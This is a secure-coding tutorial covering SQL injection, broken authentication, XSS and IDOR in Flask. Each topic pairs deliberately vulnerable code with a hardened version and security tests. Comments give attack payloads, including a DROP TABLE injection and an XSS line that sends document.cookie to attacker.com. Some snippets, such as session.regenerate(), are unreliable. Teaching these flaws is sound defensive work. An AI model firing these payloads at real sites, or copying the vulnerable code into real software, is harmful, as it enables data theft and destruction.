# Security Audit & Hardening with AI: Building Secure Applications

## Learning Objective
Learn how to identify security vulnerabilities, perform security audits, and harden applications using AI assistance. Master OWASP Top 10 vulnerabilities, secure coding practices, and security testing.

## Why Security Matters

Security vulnerabilities can lead to:
- Data breaches and stolen information
- Financial losses
- Reputational damage
- Legal liability
- System downtime

### Cost of prevention << Cost of breach**

## Prerequisites
- Understanding of web application architecture
- Basic knowledge of authentication/authorization
- Familiarity with SQL and web protocols
- GitHub Copilot or similar AI assistant

---

## Part 1: OWASP Top 10 Vulnerabilities

### Vulnerability 1: Injection (SQL Injection)

**Vulnerable Code:**

```python
# DANGEROUS - DO NOT USE
from flask import Flask, request
import sqlite3

app = Flask(__name__)

@app.route('/user')
def get_user():
    user_id = request.args.get('id')

    # SQL Injection vulnerability!
    conn = sqlite3.connect('app.db')
    cursor = conn.cursor()
    query = f"SELECT * FROM users WHERE id = {user_id}"
    cursor.execute(query)
    user = cursor.fetchone()

    return {'user': user}

# Attack: /user?id=1 OR 1=1
# Returns all users!

# Attack: /user?id=1; DROP TABLE users; --
# Deletes the entire users table!
```

**Exercise 1.1:** Ask AI to identify and fix vulnerabilities.

**Prompt:**

```txt
Analyze this code for security vulnerabilities:

[Paste vulnerable code]

1. Identify all security issues
2. Explain how each vulnerability can be exploited
3. Provide a secure implementation
4. Add input validation
5. Add logging for security events
```

**Secure Implementation:**

```python
from flask import Flask, request, jsonify
import sqlite3
import logging
from typing import Optional

app = Flask(__name__)

# Setup security logging
security_logger = logging.getLogger('security')
security_logger.setLevel(logging.WARNING)
handler = logging.FileHandler('security.log')
security_logger.addHandler(handler)

def validate_user_id(user_id: str) -> Optional[int]:
    """Validate user ID is a positive integer."""
    try:
        uid = int(user_id)
        if uid <= 0:
            raise ValueError("User ID must be positive")
        return uid
    except (ValueError, TypeError):
        return None

@app.route('/user')
def get_user():
    user_id_str = request.args.get('id', '')

    # Validate input
    user_id = validate_user_id(user_id_str)
    if user_id is None:
        security_logger.warning(
            f"Invalid user ID attempt: {user_id_str} from {request.remote_addr}"
        )
        return jsonify({'error': 'Invalid user ID'}), 400

    try:
        conn = sqlite3.connect('app.db')
        cursor = conn.cursor()

        # Use parameterized query (prevents SQL injection)
        query = "SELECT id, username, email FROM users WHERE id = ?"
        cursor.execute(query, (user_id,))
        user = cursor.fetchone()

        if user is None:
            return jsonify({'error': 'User not found'}), 404

        # Don't expose internal structure
        return jsonify({
            'user': {
                'id': user[0],
                'username': user[1],
                'email': user[2]
            }
        })

    except sqlite3.Error as e:
        # Log error but don't expose details to user
        logging.error(f"Database error: {e}")
        return jsonify({'error': 'Internal server error'}), 500

    finally:
        conn.close()
```

---

### Vulnerability 2: Broken Authentication

**Vulnerable Code:**

```python
# DANGEROUS - Multiple authentication issues
import hashlib
from flask import Flask, request, session

app = Flask(__name__)
app.secret_key = "secret"  # Weak secret key!

@app.route('/login', methods=['POST'])
def login():
    username = request.form['username']
    password = request.form['password']

    # Weak password hashing (MD5 is broken!)
    password_hash = hashlib.md5(password.encode()).hexdigest()

    conn = sqlite3.connect('app.db')
    cursor = conn.cursor()

    # No rate limiting - brute force possible
    # No account lockout
    # Timing attack possible
    cursor.execute(
        "SELECT * FROM users WHERE username = ? AND password = ?",
        (username, password_hash)
    )
    user = cursor.fetchone()

    if user:
        # Session fixation vulnerability
        session['user_id'] = user[0]
        session['is_admin'] = user[3]  # Trusting client-side data
        return "Logged in"

    return "Login failed", 401

@app.route('/admin')
def admin():
    # Weak authorization check
    if session.get('is_admin'):
        return "Admin panel"
    return "Forbidden", 403
```

**Exercise 1.2:** Implement secure authentication.

**Prompt:**

```txt
This authentication system has multiple security flaws.
Create a secure implementation with:

1. Strong password hashing (bcrypt/argon2)
1. Rate limiting
1. Account lockout after failed attempts
1. Secure session management
1. CSRF protection
1. Two-factor authentication (TOTP)
1. Password complexity requirements
1. Audit logging

Use industry best practices.
```

**Secure Implementation:**

```python
from flask import Flask, request, session, jsonify
from flask_limiter import Limiter
from flask_limiter.util import get_remote_address
import bcrypt
import pyotp
import secrets
import time
from datetime import datetime, timedelta
import logging

app = Flask(__name__)

# Generate a strong secret key
app.secret_key = secrets.token_hex(32)

# Setup rate limiting
limiter = Limiter(
    app=app,
    key_func=get_remote_address,
    default_limits=["200 per day", "50 per hour"]
)

# Security audit log
audit_logger = logging.getLogger('audit')
audit_logger.setLevel(logging.INFO)
handler = logging.FileHandler('audit.log')
formatter = logging.Formatter(
    '%(asctime)s - %(name)s - %(levelname)s - %(message)s'
)
handler.setFormatter(formatter)
audit_logger.addHandler(handler)

# Track failed login attempts
failed_attempts = {}  # In production, use Redis

class PasswordPolicy:
    """Password complexity requirements."""
    MIN_LENGTH = 12
    REQUIRE_UPPERCASE = True
    REQUIRE_LOWERCASE = True
    REQUIRE_DIGIT = True
    REQUIRE_SPECIAL = True

    @staticmethod
    def validate(password: str) -> tuple[bool, str]:
        """Validate password against policy."""
        if len(password) < PasswordPolicy.MIN_LENGTH:
            return False, f"Password must be at least {PasswordPolicy.MIN_LENGTH} characters"

        if PasswordPolicy.REQUIRE_UPPERCASE and not any(c.isupper() for c in password):
            return False, "Password must contain at least one uppercase letter"

        if PasswordPolicy.REQUIRE_LOWERCASE and not any(c.islower() for c in password):
            return False, "Password must contain at least one lowercase letter"

        if PasswordPolicy.REQUIRE_DIGIT and not any(c.isdigit() for c in password):
            return False, "Password must contain at least one digit"

        if PasswordPolicy.REQUIRE_SPECIAL and not any(c in "!@#$%^&*()_+-=[]{}|;:,.<>?" for c in password):
            return False, "Password must contain at least one special character"

        return True, ""

def hash_password(password: str) -> str:
    """Hash password using bcrypt."""
    salt = bcrypt.gensalt(rounds=12)
    return bcrypt.hashpw(password.encode(), salt).decode()

def verify_password(password: str, hashed: str) -> bool:
    """Verify password against hash (constant time)."""
    try:
        return bcrypt.checkpw(password.encode(), hashed.encode())
    except Exception:
        return False

def is_account_locked(username: str) -> bool:
    """Check if account is locked due to failed attempts."""
    if username not in failed_attempts:
        return False

    attempts = failed_attempts[username]
    if attempts['count'] >= 5:
        # Lock for 15 minutes
        if time.time() - attempts['last_attempt'] < 900:
            return True
        else:
            # Unlock account
            del failed_attempts[username]
            return False

    return False

def record_failed_attempt(username: str):
    """Record a failed login attempt."""
    if username not in failed_attempts:
        failed_attempts[username] = {'count': 0, 'last_attempt': 0}

    failed_attempts[username]['count'] += 1
    failed_attempts[username]['last_attempt'] = time.time()

@app.route('/register', methods=['POST'])
@limiter.limit("5 per hour")
def register():
    """Register a new user."""
    data = request.get_json()

    username = data.get('username', '').strip()
    password = data.get('password', '')
    email = data.get('email', '').strip()

    # Validate inputs
    if not username or not password or not email:
        return jsonify({'error': 'Missing required fields'}), 400

    # Validate password policy
    valid, message = PasswordPolicy.validate(password)
    if not valid:
        return jsonify({'error': message}), 400

    # Hash password
    password_hash = hash_password(password)

    # Generate TOTP secret for 2FA
    totp_secret = pyotp.random_base32()

    try:
        conn = sqlite3.connect('app.db')
        cursor = conn.cursor()

        # Check if user exists
        cursor.execute("SELECT id FROM users WHERE username = ?", (username,))
        if cursor.fetchone():
            return jsonify({'error': 'Username already exists'}), 400

        # Insert user
        cursor.execute(
            """INSERT INTO users (username, password_hash, email, totp_secret, created_at)
               VALUES (?, ?, ?, ?, ?)""",
            (username, password_hash, email, totp_secret, datetime.now())
        )
        conn.commit()

        audit_logger.info(f"User registered: {username} from {request.remote_addr}")

        return jsonify({
            'message': 'Registration successful',
            'totp_secret': totp_secret  # Show once for 2FA setup
        }), 201

    except sqlite3.Error as e:
        logging.error(f"Database error during registration: {e}")
        return jsonify({'error': 'Registration failed'}), 500

    finally:
        conn.close()

@app.route('/login', methods=['POST'])
@limiter.limit("10 per minute")
def login():
    """Authenticate user with username, password, and TOTP."""
    data = request.get_json()

    username = data.get('username', '').strip()
    password = data.get('password', '')
    totp_code = data.get('totp_code', '')

    # Check if account is locked
    if is_account_locked(username):
        audit_logger.warning(
            f"Login attempt on locked account: {username} from {request.remote_addr}"
        )
        return jsonify({'error': 'Account temporarily locked. Try again later.'}), 403

    try:
        conn = sqlite3.connect('app.db')
        cursor = conn.cursor()

        # Get user (constant time to prevent username enumeration)
        cursor.execute(
            "SELECT id, password_hash, totp_secret, is_active FROM users WHERE username = ?",
            (username,)
        )
        user = cursor.fetchone()

        # Always verify password even if user doesn't exist (timing attack prevention)
        if user is None:
            # Perform dummy hash verification
            verify_password(password, hash_password("dummy"))
            record_failed_attempt(username)
            audit_logger.warning(
                f"Failed login attempt for non-existent user: {username} from {request.remote_addr}"
            )
            return jsonify({'error': 'Invalid credentials'}), 401

        user_id, password_hash, totp_secret, is_active = user

        # Check if account is active
        if not is_active:
            audit_logger.warning(
                f"Login attempt on inactive account: {username} from {request.remote_addr}"
            )
            return jsonify({'error': 'Account is inactive'}), 403

        # Verify password
        if not verify_password(password, password_hash):
            record_failed_attempt(username)
            audit_logger.warning(
                f"Failed login attempt (wrong password): {username} from {request.remote_addr}"
            )
            return jsonify({'error': 'Invalid credentials'}), 401

        # Verify TOTP
        totp = pyotp.TOTP(totp_secret)
        if not totp.verify(totp_code, valid_window=1):
            record_failed_attempt(username)
            audit_logger.warning(
                f"Failed login attempt (wrong TOTP): {username} from {request.remote_addr}"
            )
            return jsonify({'error': 'Invalid 2FA code'}), 401

        # Successful login - regenerate session ID (prevent session fixation)
        session.clear()
        session.regenerate()  # If using Flask-Session

        # Set session data
        session['user_id'] = user_id
        session['username'] = username
        session['login_time'] = datetime.now().isoformat()

        # Clear failed attempts
        if username in failed_attempts:
            del failed_attempts[username]

        audit_logger.info(
            f"Successful login: {username} from {request.remote_addr}"
        )

        return jsonify({'message': 'Login successful'}), 200

    except Exception as e:
        logging.error(f"Error during login: {e}")
        return jsonify({'error': 'Login failed'}), 500

    finally:
        conn.close()

@app.route('/logout', methods=['POST'])
def logout():
    """Logout user and invalidate session."""
    username = session.get('username', 'unknown')
    session.clear()

    audit_logger.info(
        f"User logged out: {username} from {request.remote_addr}"
    )

    return jsonify({'message': 'Logged out successfully'}), 200

@app.before_request
def check_session_timeout():
    """Check for session timeout (30 minutes)."""
    if 'login_time' in session:
        login_time = datetime.fromisoformat(session['login_time'])
        if datetime.now() - login_time > timedelta(minutes=30):
            session.clear()
            return jsonify({'error': 'Session expired'}), 401
```

---

### Vulnerability 3: Cross-Site Scripting (XSS)

**Vulnerable Code:**

```python
from flask import Flask, request, render_template_string

app = Flask(__name__)

@app.route('/search')
def search():
    query = request.args.get('query', '')

    # XSS vulnerability!
    html = f"""
    <html>
        <body>
            <h1>Search Results for: {query}</h1>
            <p>No results found</p>
        </body>
    </html>
    """

    return html

# Attack: /search?query=<script>alert('XSS')</script>
# Executes JavaScript in victim's browser!

# Attack: /search?query=<img src=x onerror="fetch('http://attacker.com/steal?cookie='+document.cookie)">
# Steals user's cookies!
```

**Exercise 1.3:** Fix XSS vulnerabilities.

**Prompt:**

```txt
This code is vulnerable to XSS attacks. Provide a secure implementation using:
1. Proper output escaping
2. Content Security Policy
3. HTTPOnly cookies
4. Input sanitization
5. Template engine (Jinja2) with auto-escaping
```

**Secure Implementation:**

```python
from flask import Flask, request, render_template, escape
from markupsafe import Markup
import bleach

app = Flask(__name__)

# Configure secure cookies
app.config['SESSION_COOKIE_HTTPONLY'] = True
app.config['SESSION_COOKIE_SECURE'] = True  # HTTPS only
app.config['SESSION_COOKIE_SAMESITE'] = 'Lax'

# Content Security Policy
@app.after_request
def add_security_headers(response):
    """Add security headers to all responses."""
    response.headers['Content-Security-Policy'] = (
        "default-src 'self'; "
        "script-src 'self'; "
        "style-src 'self' 'unsafe-inline'; "
        "img-src 'self' data: https:; "
        "font-src 'self'; "
        "connect-src 'self'; "
        "frame-ancestors 'none';"
    )
    response.headers['X-Content-Type-Options'] = 'nosniff'
    response.headers['X-Frame-Options'] = 'DENY'
    response.headers['X-XSS-Protection'] = '1; mode=block'
    return response

def sanitize_html(html: str) -> str:
    """Sanitize HTML to remove dangerous tags."""
    allowed_tags = ['p', 'b', 'i', 'u', 'em', 'strong', 'a']
    allowed_attributes = {'a': ['href', 'title']}

    return bleach.clean(
        html,
        tags=allowed_tags,
        attributes=allowed_attributes,
        strip=True
    )

@app.route('/search')
def search():
    query = request.args.get('query', '')

    # Jinja2 auto-escapes by default
    return render_template('search.html', query=query)

# templates/search.html
"""
<!DOCTYPE html>
<html>
<head>
    <title>Search Results</title>
    <meta charset="UTF-8">
</head>
<body>
    <h1>Search Results for: {{ query }}</h1>
    <!-- Jinja2 auto-escapes query, preventing XSS -->
    <p>No results found</p>
</body>
</html>
"""

@app.route('/comment', methods=['POST'])
def submit_comment():
    """Accept user comments with HTML sanitization."""
    comment = request.form.get('comment', '')

    # Sanitize HTML
    safe_comment = sanitize_html(comment)

    # Store in database
    # ...

    return render_template('comment.html', comment=Markup(safe_comment))
```

---

### Vulnerability 4: Insecure Direct Object Reference (IDOR)

**Vulnerable Code:**

```python
@app.route('/document/<int:doc_id>')
def get_document(doc_id):
    # No authorization check!
    conn = sqlite3.connect('app.db')
    cursor = conn.cursor()
    cursor.execute("SELECT * FROM documents WHERE id = ?", (doc_id,))
    doc = cursor.fetchone()

    if doc:
        return jsonify({'document': doc})
    return jsonify({'error': 'Not found'}), 404

# Attack: Simply iterate through IDs to access all documents
# /document/1, /document/2, /document/3, ...
```

**Secure Implementation:**

```python
from functools import wraps

def require_auth(f):
    """Decorator to require authentication."""
    @wraps(f)
    def decorated_function(*args, **kwargs):
        if 'user_id' not in session:
            return jsonify({'error': 'Unauthorized'}), 401
        return f(*args, **kwargs)
    return decorated_function

def check_document_access(user_id: int, doc_id: int) -> bool:
    """Check if user has access to document."""
    conn = sqlite3.connect('app.db')
    cursor = conn.cursor()

    # Check ownership or shared access
    cursor.execute(
        """SELECT COUNT(*) FROM documents d
           LEFT JOIN document_access da ON d.id = da.document_id
           WHERE d.id = ? AND (d.owner_id = ? OR da.user_id = ?)""",
        (doc_id, user_id, user_id)
    )

    has_access = cursor.fetchone()[0] > 0
    conn.close()

    return has_access

@app.route('/document/<int:doc_id>')
@require_auth
def get_document(doc_id):
    """Get document with authorization check."""
    user_id = session['user_id']

    # Check authorization
    if not check_document_access(user_id, doc_id):
        audit_logger.warning(
            f"Unauthorized document access attempt: "
            f"user={user_id} doc={doc_id} ip={request.remote_addr}"
        )
        return jsonify({'error': 'Forbidden'}), 403

    # Retrieve document
    conn = sqlite3.connect('app.db')
    cursor = conn.cursor()
    cursor.execute(
        "SELECT id, title, content, created_at FROM documents WHERE id = ?",
        (doc_id,)
    )
    doc = cursor.fetchone()
    conn.close()

    if doc:
        return jsonify({
            'document': {
                'id': doc[0],
                'title': doc[1],
                'content': doc[2],
                'created_at': doc[3]
            }
        })

    return jsonify({'error': 'Not found'}), 404
```

---

## Part 2: Security Testing

### Exercise 2.1: Automated Security Scanning

**Setup Security Tools:**

```bash
# Install security scanners
pip install bandit safety

# Bandit - finds common security issues in Python code
bandit -r . -f json -o bandit-report.json

# Safety - checks dependencies for known vulnerabilities
safety check --json > safety-report.json
```

**Create Security Test Suite:**

```python
# tests/test_security.py
import pytest
from app import app

class TestSecurityHeaders:
    """Test security headers are present."""

    def test_csp_header(self):
        """Test Content-Security-Policy header."""
        with app.test_client() as client:
            response = client.get('/')
            assert 'Content-Security-Policy' in response.headers

    def test_xss_protection_header(self):
        """Test X-XSS-Protection header."""
        with app.test_client() as client:
            response = client.get('/')
            assert response.headers.get('X-XSS-Protection') == '1; mode=block'

    def test_clickjacking_protection(self):
        """Test X-Frame-Options header."""
        with app.test_client() as client:
            response = client.get('/')
            assert response.headers.get('X-Frame-Options') == 'DENY'

class TestInputValidation:
    """Test input validation."""

    def test_sql_injection_prevention(self):
        """Test SQL injection is prevented."""
        with app.test_client() as client:
            # Try SQL injection
            response = client.get('/user?id=1 OR 1=1')
            assert response.status_code == 400

    def test_xss_prevention(self):
        """Test XSS is prevented."""
        with app.test_client() as client:
            response = client.get('/search?query=<script>alert(1)</script>')
            # Check that script is escaped
            assert b'<script>' not in response.data

class TestAuthentication:
    """Test authentication security."""

    def test_rate_limiting(self):
        """Test login rate limiting."""
        with app.test_client() as client:
            # Try multiple failed logins
            for i in range(15):
                client.post('/login', json={
                    'username': 'test',
                    'password': 'wrong'
                })

            # Next attempt should be rate limited
            response = client.post('/login', json={
                'username': 'test',
                'password': 'wrong'
            })
            assert response.status_code == 429

    def test_session_timeout(self):
        """Test session expires after timeout."""
        # Test implementation
        pass
```

---

## Part 3: Security Checklist

### Pre-Deployment Security Checklist

**Infrastructure:**
- [ ] Use HTTPS everywhere (TLS 1.2+)
- [ ] Enable HSTS headers
- [ ] Use secure cookies (HttpOnly, Secure, SameSite)
- [ ] Implement rate limiting
- [ ] Setup WAF (Web Application Firewall)
- [ ] Enable DDoS protection
- [ ] Use VPN for admin access
- [ ] Implement network segmentation

**Authentication & Authorization:**
- [ ] Use strong password hashing (bcrypt/argon2)
- [ ] Implement 2FA
- [ ] Session timeout (30 minutes)
- [ ] Account lockout after failed attempts
- [ ] Secure password reset flow
- [ ] Audit logging for auth events
- [ ] Least privilege principle
- [ ] Role-based access control

**Data Protection:**
- [ ] Encrypt sensitive data at rest
- [ ] Encrypt data in transit
- [ ] Sanitize all inputs
- [ ] Escape all outputs
- [ ] Use parameterized queries
- [ ] Validate file uploads
- [ ] Implement CSRF protection
- [ ] Secure API keys and secrets

**Monitoring:**
- [ ] Security audit logs
- [ ] Intrusion detection system
- [ ] Error logging (no sensitive data)
- [ ] Alert on suspicious activity
- [ ] Regular security scans
- [ ] Penetration testing
- [ ] Bug bounty program

---

## Success Criteria

After completing this exercise, you should be able to:

- [ ] Identify OWASP Top 10 vulnerabilities
- [ ] Implement secure authentication
- [ ] Prevent SQL injection
- [ ] Prevent XSS attacks
- [ ] Implement proper authorization
- [ ] Use security headers correctly
- [ ] Perform security testing
- [ ] Use automated security scanners
- [ ] Follow secure coding practices
- [ ] Create security audit logs

## Reflection Questions

1. Which vulnerability is most dangerous? Why?
1. How did AI help with security implementations?
1. What security measures are most important?
1. How would you handle a security breach?
1. What ongoing security practices will you adopt?

## Further Practice

- Complete CTF challenges (HackTheBox, TryHackMe)
- Read OWASP Testing Guide
- Practice with DVWA (Damn Vulnerable Web Application)
- Learn about penetration testing
- Study cryptography basics
- Practice secure code review

Remember: **Security is not a feature, it's a requirement. Build it in from the start!**
